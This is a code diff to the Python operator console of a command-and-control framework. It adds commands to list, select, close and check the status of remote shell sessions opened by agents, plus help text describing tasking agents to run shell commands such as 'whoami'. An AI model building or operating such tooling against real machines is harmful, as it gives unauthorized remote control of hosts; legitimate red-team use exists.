@@ -117,7 +117,7 @@ class CLI(cmd.Cmd):
         self._exit_sessions_lock = Lock()
         self.exit_session = False
         self.server_start_flag = False
-        self.current_shell_conn = None
+        self.current_shell_conn = None        
 
     def emptyline(self):
         pass       
@@ -128,6 +128,7 @@ class CLI(cmd.Cmd):
         else:
             if "go back" in line:
                 self.prompt = 'c2_cli> '
+                self.current_shell_conn = None
             else:
                 try:
                     if self.current_shell_conn:
@@ -144,11 +145,14 @@ class CLI(cmd.Cmd):
                     return
 
     def list_connections(self):        
+        if not self.server_start_flag:
+            print(f"\nSessions server is not running...\n")
+            return
         try:
             res = '-------------------------------- Sessions --------------------------------\n'
-            print(f'self.connections len : {len(self.connections)}')
+            # print(f'self.connections len : {len(self.connections)}')
             for i, conn in enumerate(self.connections):
-                print(f'i : {i}')
+                # print(f'i : {i}')
                 try:
                     send_msg(conn,str.encode(f'c2-sessions ping'))                    
                     conn.settimeout(5.0)
@@ -217,8 +221,8 @@ class CLI(cmd.Cmd):
 
                 with self._exit_sessions_lock:                    
                     if self.exit_session:
-                        print('Session Handler is shutting down...\n DO NO FORGET TO "task delete uuid" if you don\'t want to keep retrying...\n\nPress Enter...\n')
-                        self.close_sessions_and_quit()     
+                        print('\nSession Handler is shutting down...\nDO NOT FORGET TO "task delete uuid" if you don\'t want the agents to keep retrying...\n\nPress Enter...\n')
+                        self.close_sessions_and_quit_handler()     
                         break
             except Exception as ex:
                 print(f"Error on accept_connections: {ex}")                  
@@ -231,7 +235,24 @@ class CLI(cmd.Cmd):
             
         return
 
-    def close_sessions_and_quit(self):        
+    def close_session(self, conn_idx):                
+        try:
+            conn_to_close = self.connections[conn_idx]
+
+            if self.current_shell_conn == conn_to_close:                
+                self.current_shell_conn = None
+
+            send_msg(conn_to_close,str.encode(f'c2-sessions quit'))
+            conn_to_close.shutdown(2)
+            conn_to_close.close()
+            
+            del self.connections[conn_idx]
+            del self.addresses[conn_idx]
+
+        except Exception as ex:
+            print(f"Error on close_sessions_and_quit: {ex}")    
+
+    def close_sessions_and_quit_handler(self):        
         for conn in self.connections:
             try:
                 send_msg(conn,str.encode(f'c2-sessions quit'))
@@ -239,21 +260,25 @@ class CLI(cmd.Cmd):
                 conn.close()
 
             except Exception as ex:
-                print(f"Error on close_sessions_and_quit: {ex}")                 
+                pass# print(f"Error on close_sessions_and_quit: {ex} - Maybe the agents have already closed their connection")                 
         self.ServerSocket.close()
 
-    def close_session_handler(self):
-        with self._exit_sessions_lock:
-            self.exit_session = True   
-            try:         
-                # sends a message to itself to close the connections
-                s = socket.socket()
-                s.connect((self.host, self.port))
-                send_msg(s,str.encode(f'local_msg'))                
-                s.close()
-            except Exception as ex:
-                print(f"Error in local_msg: {ex}")
-        self.server_start_flag = False
+    def close_session_handler(self, quit = False):
+        if self.server_start_flag:
+            with self._exit_sessions_lock:
+                self.exit_session = True   
+                try:         
+                    # sends a message to itself to close the connections
+                    s = socket.socket()
+                    s.connect((self.host, self.port))
+                    send_msg(s,str.encode(f'local_msg'))                
+                    s.close()
+                except Exception as ex:
+                    print(f"Error in local_msg: {ex}")
+            self.server_start_flag = False
+        else:
+            if not quit:
+                print(f"\nSessions server is not running...\n")
 
     def print_rows(self, three_args = False, num = False, number = 0):
         for i, row in enumerate(self.cursor.fetchall()):
@@ -464,8 +489,20 @@ class CLI(cmd.Cmd):
 
     def do_sessions(self, args):
         args = args.split()
-        if len(args) == 2 and args[0] == "server":
+        if len(args) >= 2 and args[0] == "server":
             if args[1] == "start":
+
+                if self.server_start_flag:
+                    print(f"\nServer is already running on port: {self.port}\n")
+                    return
+
+                try:
+                    port_to_use = int(args[2])
+                    self.port = port_to_use
+                    print(f'\nSessions Server started at port: {self.port}\n')
+                except:                    
+                    self.port = 5555
+                    print(f'\nNot a valid integer for port... Continuing with the default port: {self.port} \n')
 
                 self.server_start_flag = True
 
@@ -479,6 +516,13 @@ class CLI(cmd.Cmd):
                 #start_new_thread(self.accept_connections())
             elif args[1] == "stop":            
                 self.close_session_handler()
+            
+            elif args[1] == "status":
+                if self.server_start_flag:
+                    print(f"\nSessions server is running on port: {self.port}\n")
+                else:
+                    print(f"\nSessions server is not running...\n")
+
         elif len(args) == 2 and args[0] == "select":
             try:
                 host_idx = int(args[1])
@@ -497,18 +541,38 @@ class CLI(cmd.Cmd):
 
             self.prompt = f'{self.addresses[host_idx][2]}> '
 
+        elif len(args) == 2 and args[0] == "close":
+            try:
+                host_idx = int(args[1])
+            except:
+                print('Use an integer from the sessions list')
+                return             
+            
+            try:                
+                #host_conn = self.connections[host_idx]
+                self.close_session(host_idx)                   
+                
+            except:
+                print('Connection not found. Use sessions list')
+                return       
+
+            print("Connection closed\n")
+            print("DO NOT FORGET TO 'task delete uuid' if you don't want to keep connecting\n")
+
+            self.prompt = 'c2_cli> '
+
         elif len(args) == 1:
             if args[0] == "list":
                 self.list_connections()            
+
         else:
             self.do_help("sessions")
             
     def do_exit(self, args):       
         if self.prompt != 'c2_cli> ':
             print("If you want to exit the admin console use 'go back' first and then 'exit'")
-        else:
-            if self.server_start_flag:
-                self.close_session_handler()
+        else:            
+            self.close_session_handler(True)
             print("Bye Bye Operator!")
             return True
     
@@ -567,8 +631,8 @@ class CLI(cmd.Cmd):
 
     def complete_sessions(self, text, line, begidx, endidx):
         
-        options = ["server", "select", "list"]
-        options_server_args = ["start", "stop"]        
+        options = ["server", "select", "list", "close"] 
+        options_server_args = ["start", "stop", "status"]        
 
         if "sessions server" in line:
             return [i for i in options_server_args if i.startswith(text)]
@@ -596,7 +660,7 @@ class CLI(cmd.Cmd):
               "      c2-shell cmd: It takes an shell command for the agent to execute. eg. c2-shell whoami\n"
               "         cmd: The command to execute.\n"
               "      c2-sleep: Configure the interval that an agent will check for tasks.\n"
-              "      c2-session port: Instructs the agent to open a shell session with the server.\n"
+              "      c2-sessions port: Instructs the agent to open a shell session with the server to this port.\n"
               "         port: The port to connect to. If it is not provided it defaults to 5555.\n"
               "      c2-quit: Forces an agent to quit.\n\n"
               "  task delete arg\n"
@@ -619,14 +683,20 @@ class CLI(cmd.Cmd):
         
         if args in ["sessions",""]:
             print("Sessions:\n\n"         
-              "  sessions server arg\n"
+              "  sessions server arg [port]\n"
               "    Controls a session handler.\n"              
               "    arg: can have the following values: 'start' or 'stop' \n"
+              "    port: port is optional for the start arg and if it is not provided it defaults to 5555. This argument defines the port of the sessions server\n"
               "  sessions select arg\n"
               "    Select in which session to attach.\n"
               "    arg: the index from the 'sessions list' result \n"
+              "  sessions close arg\n"
+              "    Close a session.\n"
+              "    arg: the index from the 'sessions list' result \n"
               "  sessions list\n"
               "    Displays the availiable sessions\n"              
+              "  sessions status\n"
+              "    Displays information on the session server status \n"   
               )
 
 if __name__ == '__main__':
